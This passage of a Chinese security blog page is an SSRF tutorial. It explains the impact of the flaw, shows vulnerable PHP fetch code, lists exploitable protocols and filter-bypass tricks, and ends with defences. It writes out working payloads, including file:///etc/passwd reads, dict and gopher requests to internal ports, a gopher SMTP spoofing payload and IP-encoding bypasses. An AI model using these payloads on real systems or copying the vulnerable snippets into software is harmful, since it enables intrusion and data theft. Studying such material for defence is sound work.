+    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token shell-comment comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span>
+    <span class="token variable">$data</span> <span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="3-危害有："><a href="#3-危害有：" class="headerlink" title="3.危害有："></a>3.危害有：</h3><p>3.1 扫描内网开放服务</p>
+<p>3.2 向内部任意主机的任意端口发送payload来攻击内网服务</p>
+<p>3.3 DOS攻击（请求大文件，始终保持连接Keep-Alive Always）</p>
+<p>3.4 攻击内网的web应用，例如直接SQL注入、XSS攻击等</p>
+<p>3.5 利用file、gopher、dict协议读取本地文件、执行命令等</p>
+<h3 id="4-检测"><a href="#4-检测" class="headerlink" title="4.检测"></a>4.检测</h3><p>假设一个漏洞场景：某网站有一个在线加载功能可以把指定的远程图片加载到本地，功能链接如下：</p>
+<pre class="line-numbers language-php+HTML"><code class="language-php+HTML">http://www.xxx.com/image.php?image=http://www.xxc.com/a.jpg
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>那么网站请求的大概步骤应该是类似以下：</p>
+<pre class="line-numbers language-php"><code class="language-php">用户输入图片地址<span class="token operator">-</span><span class="token operator">></span>请求发送到服务端解析<span class="token operator">-</span><span class="token operator">></span>服务端请求链接地址的图片数据<span class="token operator">-</span><span class="token operator">></span>获取请求的数据加载到前台显示
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这个过程中可能出现问题的点就在于请求发送到服务端的时候，系统没有效验前台给定的参数是不是允许访问的地址域名，例如，如上的链接可以修改为：</p>
+<pre class="line-numbers language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//www.xxx.com/image.php?image=http://127.0.0.1:22</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>如上请求时则可能返回请求的端口banner。如果协议允许，甚至可以使用其他协议来读取和执行相关命令。例如</p>
+<pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.xxx.com/image.php?image=file:///etc/passwd</span>
+http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.xxx.com/image.php?image=dict://127.0.0.1:22/data:data2 (dict可以向服务端口请求data data2)</span>
+http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.xxx.com/image.php?image=gopher://127.0.0.1:2233/_test (向2233端口发送数据test,同样可以发送POST请求)</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>对于不同语言实现的web系统可以使用的协议也存在不同的差异，其中：</p>
+<pre class="line-numbers language-php"><code class="language-php">php<span class="token punctuation">:</span>
+http、https、file、gopher、phar、dict、ftp、ssh、telnet<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+java<span class="token punctuation">:</span>
+http、https、file、ftp、jar、netdoc、mailto<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>判断漏洞是否存在的重要前提是，请求的服务器发起的，以上链接即使存在并不一定代表这个请求是服务器发起的。因此前提不满足的情况下，SSRF是不必要考虑的。</p>
+<pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.xxx.com/image.php?image=http://www.xxc.com/a.jpg</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>链接获取后，是由js来获取对应参数交由window.location来处理相关的请求，或者加载到当前的iframe框架中，此时并不存在SSRF ，因为请求是本地发起，并不能产生攻击服务端内网的需求。</p>
+<h2 id="二、SSRF相关函数和协议"><a href="#二、SSRF相关函数和协议" class="headerlink" title="二、SSRF相关函数和协议"></a>二、SSRF相关函数和协议</h2><p>函数<br>file_get_contents()、fsockopen()、curl_exec()、fopen()、readfile()等函数使用不当会造成SSRF漏洞。</p>
+<pre class="line-numbers language-php"><code class="language-php">注意事项：
+一般情况下<span class="token constant">PHP</span>不会开启fopen的gopher wrapper
+file_get_contents的gopher协议不能<span class="token constant">URL</span>编码
+file_get_contents关于Gopher的<span class="token number">302</span>跳转会出现bug，导致利用失败
+curl<span class="token operator">/</span>libcurl <span class="token number">7.43</span> 上gopher协议存在<span class="token function">bug</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">00</span>截断<span class="token punctuation">)</span> 经测试<span class="token number">7.49</span> 可用
+<span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//默认不跟踪跳转，</span>
+<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// file_get_contents支持php://input协议</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="1-file-get-contents"><a href="#1-file-get-contents" class="headerlink" title="1.file_get_contents()"></a>1.file_get_contents()</h3><p>file_get_content函数从用户指定的url获取内容，然后指定一个文件名进行保存，并展示给用户。</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="2-fsockopen"><a href="#2-fsockopen" class="headerlink" title="2.fsockopen()"></a>2.fsockopen()</h3><p>fsockopen函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">function</span> <span class="token function">GetFile</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span><span class="token variable">$port</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">"$errstr (error number $errno) \n"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>         <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string">"GET $link HTTP/1.1\r\n"</span><span class="token punctuation">;</span>         <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"Host: $host\r\n"</span><span class="token punctuation">;</span>         <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"Connection: Close\r\n\r\n"</span><span class="token punctuation">;</span>         <span class="token variable">$out</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"\r\n"</span><span class="token punctuation">;</span>         <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$contents</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>         <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token variable">$contents</span><span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">return</span> <span class="token variable">$contents</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token delimiter">?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="3-curl-exec"><a href="#3-curl-exec" class="headerlink" title="3.curl_exec()"></a>3.curl_exec()</h3><p>curl_exec函数用于执行指定的cURL会话</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$curlobj</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 创建新的 cURL 资源    curl_setopt($curlobj, CURLOPT_POST, 0);    curl_setopt($curlobj,CURLOPT_URL,$link);    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);// 设置 URL 和相应的选项    $result=curl_exec($curlobj);// 抓取 URL 并把它传递给浏览器    curl_close($curlobj);// 关闭 cURL 资源，并且释放系统资源    $filename = './curled/'.rand().'.txt';    file_put_contents($filename, $result);     echo $result;}?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>三、相关可利用协议</p>
+<ol>
+<li><p>file： 在有回显的情况下，利用 file 协议可以读取任意内容</p>
+</li>
+<li><p>dict：泄露安装软件版本信息，查看端口，操作内网redis服务等</p>
+</li>
+<li><p>gopher：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</p>
+</li>
+<li><p>http/s：探测内网主机存活</p>
+</li>
+<li><p>。。。</p>
+</li>
+</ol>
+<h2 id="四、ssrf常用简单绕过"><a href="#四、ssrf常用简单绕过" class="headerlink" title="四、ssrf常用简单绕过"></a>四、ssrf常用简单绕过</h2><h3 id="1-限制为http-www-xxx-com-域名时（利用-）"><a href="#1-限制为http-www-xxx-com-域名时（利用-）" class="headerlink" title="1. 限制为http://www.xxx.com 域名时（利用@）"></a>1. 限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名时（利用@）</h3><pre class="line-numbers language-php"><code class="language-php">可以尝试采用http基本身份认证的方式绕过如：http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="2-限制请求IP不为内网地址"><a href="#2-限制请求IP不为内网地址" class="headerlink" title="2.限制请求IP不为内网地址"></a>2.限制请求IP不为内网地址</h3><p>​    1：采用短网址绕过，比如百度短地址<a target="_blank" rel="noopener" href="https://dwz.cn/">https://dwz.cn/</a><br>   2：利用特殊域名<br>原理是DNS解析。xip.io可以指向任意域名，即</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">.</span>xip<span class="token punctuation">.</span>io，可解析为<span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>   3：采用进制转换，127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433</p>
+<h3 id="3-限制请求只为http协议"><a href="#3-限制请求只为http协议" class="headerlink" title="3.限制请求只为http协议"></a>3.限制请求只为http协议</h3><pre class="line-numbers language-php"><code class="language-php">采用<span class="token number">302</span>跳转，百度短地址，或者使用https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//tinyurl.com生成302跳转地址。</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="4-利用"><a href="#4-利用" class="headerlink" title="4.利用[::]"></a>4.利用[::]</h3><p>可以利用[::]来绕过localhost</p>
+<pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//[::]:80/  >>>  http://127.0.0.1</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="5-利用句号"><a href="#5-利用句号" class="headerlink" title="5.利用句号"></a>5.利用句号</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token number">127</span>。<span class="token number">0</span>。<span class="token number">0</span>。<span class="token number">1</span>  <span class="token operator">></span><span class="token operator">></span><span class="token operator">></span>  <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="6-利用特殊地址"><a href="#6-利用特殊地址" class="headerlink" title="6.利用特殊地址"></a>6.利用特殊地址</h3><pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//0/</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="7-利用协议"><a href="#7-利用协议" class="headerlink" title="7.利用协议"></a>7.利用协议</h3><pre class="line-numbers language-php"><code class="language-php">Dict<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//dict://</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user-auth</span><span class="token punctuation">></span></span></span>@<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>host</span><span class="token punctuation">></span></span></span><span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>port</span><span class="token punctuation">></span></span></span><span class="token operator">/</span>d<span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>word</span><span class="token punctuation">></span></span></span>ssrf<span class="token punctuation">.</span>php<span class="token operator">?</span>url<span class="token operator">=</span>dict<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//attacker:11111/SFTP://ssrf.php?url=sftp://example.com:11111/TFTP://ssrf.php?url=tftp://example.com:12346/TESTUDPPACKETLDAP://ssrf.php?url=ldap://localhost:11211/%0astats%0aquitGopher://ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="8-利用上传"><a href="#8-利用上传" class="headerlink" title="8.利用上传"></a>8.利用上传</h3><p>修改”type=file”为”type=url”<br>比如：<br>上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF</p>
+<h3 id="9-利用Enclosed-alphanumerics"><a href="#9-利用Enclosed-alphanumerics" class="headerlink" title="9.利用Enclosed alphanumerics"></a>9.利用Enclosed alphanumerics</h3><pre class="line-numbers language-php"><code class="language-php">ⓔⓧⓐⓜⓟⓛⓔ<span class="token punctuation">.</span>ⓒⓞⓜ  <span class="token operator">></span><span class="token operator">></span><span class="token operator">></span>  example<span class="token punctuation">.</span>comList<span class="token punctuation">:</span>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="10-利用xip-io-amp-xip-name"><a href="#10-利用xip-io-amp-xip-name" class="headerlink" title="10.利用xip.io &amp; xip.name"></a>10.利用xip.io &amp; xip.name</h4><pre class="line-numbers language-php"><code class="language-php">foo<span class="token punctuation">.</span>bar<span class="token number">.10</span><span class="token punctuation">.</span><span class="token number">10.0</span><span class="token punctuation">.</span><span class="token number">1</span><span class="token punctuation">.</span>xip<span class="token punctuation">.</span>io <span class="token operator">></span> <span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">0.110</span><span class="token punctuation">.</span><span class="token number">0.0</span><span class="token punctuation">.</span><span class="token number">1</span><span class="token punctuation">.</span>xip<span class="token punctuation">.</span>io <span class="token operator">></span> <span class="token number">10.0</span><span class="token punctuation">.</span><span class="token number">0</span><span class="token punctuation">.</span>1www<span class="token number">.10</span><span class="token punctuation">.</span><span class="token number">10.0</span><span class="token punctuation">.</span><span class="token number">1</span><span class="token punctuation">.</span>xip<span class="token punctuation">.</span>name <span class="token operator">></span> <span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">0.1</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="11-利用302跳转-amp-短域名-http-tinyurl-com"><a href="#11-利用302跳转-amp-短域名-http-tinyurl-com" class="headerlink" title="11.利用302跳转 &amp; 短域名(http://tinyurl.com)"></a>11.利用302跳转 &amp; 短域名(<a target="_blank" rel="noopener" href="http://tinyurl.com/">http://tinyurl.com</a>)</h4><h2 id="五、其他"><a href="#五、其他" class="headerlink" title="五、其他"></a>五、其他</h2><p>SSRF打穿内网<br>最近，国光发了篇文章，</p>
+<p>SSRF-lab<br>界面简洁好看，提供了最基本的 REST API 和客户端 WebHook 功能用于 SSRF 测试。<br>项目地址：<a target="_blank" rel="noopener" href="https://github.com/m6a-UdS/ssrf-lab">https://github.com/m6a-UdS/ssrf-lab</a><br>操作参见网上文章，如：<a target="_blank" rel="noopener" href="https://blog.csdn.net/hxhxhxhxx/article/details/111770479">https://blog.csdn.net/hxhxhxhxx/article/details/111770479</a></p>
+<h2 id="六、防御"><a href="#六、防御" class="headerlink" title="六、防御"></a>六、防御</h2><p>1.禁止跳转</p>
+<p>2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
+<p>3.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题</p>
+<p>4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）</p>
+<p>5.限制请求的端口为http常用的端口，比如 80、443、8080、8090</p>
+<p>6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/04/16/sql-zhu-ru/">sql注入</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-04-16</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/websec/">websec</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/websec/">websec</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a></span><div class="content"><h1 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h1></div><a class="more" href="/2023/04/16/sql-zhu-ru/#more">阅读更多</a><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://blog-1313934826.cos.ap-chengdu.myqcloud.com/normal-images/psc.png#https://s1.ax1x.com/2023/04/14/p9Sd0ns.png)"><div class="layout" id="footer"><div class="copyright">&copy;2023 By uf9n1x</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.1"></script><script src="/js/fancybox.js?version=1.9.1"></script><script src="/js/sidebar.js?version=1.9.1"></script><script src="/js/copy.js?version=1.9.1"></script><script src="/js/fireworks.js?version=1.9.1"></script><script src="/js/transition.js?version=1.9.1"></script><script src="/js/scroll.js?version=1.9.1"></script><script src="/js/head.js?version=1.9.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
+ <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>
